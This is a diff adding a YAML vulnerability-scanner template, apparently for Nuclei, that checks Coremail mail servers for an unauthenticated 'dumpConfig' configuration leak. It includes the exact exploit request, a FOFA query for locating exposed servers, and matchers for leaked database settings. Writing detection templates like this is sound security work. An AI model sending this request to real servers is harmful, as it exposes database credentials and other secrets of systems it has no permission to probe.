@@ -1,0 +1,33 @@
+id: coremail-config-disclosure
+
+info:
+  name: Coremail 邮件系统 dumpConfig 配置信息泄露
+  author: princechaddha
+  severity: high
+  description: |
+    Coremail 电子邮局 mailsms 接口 dumpConfig 参数可未授权导出系统配置，泄露数据库账号等敏感信息。
+  reference:
+    - https://www.secpulse.com/archives/107611.html
+  metadata:
+    max-request: 1
+    fofa-query: title="Coremail邮件系统"
+  tags: coremail,disclosure,config
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/mailsms/s?func=ADMIN:appState&dumpConfig=/'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '<object name="cm_md_db">'
+          - 'containerDefinitions'
+          - '<string name="User">coremail</string>'
+          - '<string name="EnableCoremailSmtp">'
+        condition: or
+
+      - type: status
+        status:
+          - 200
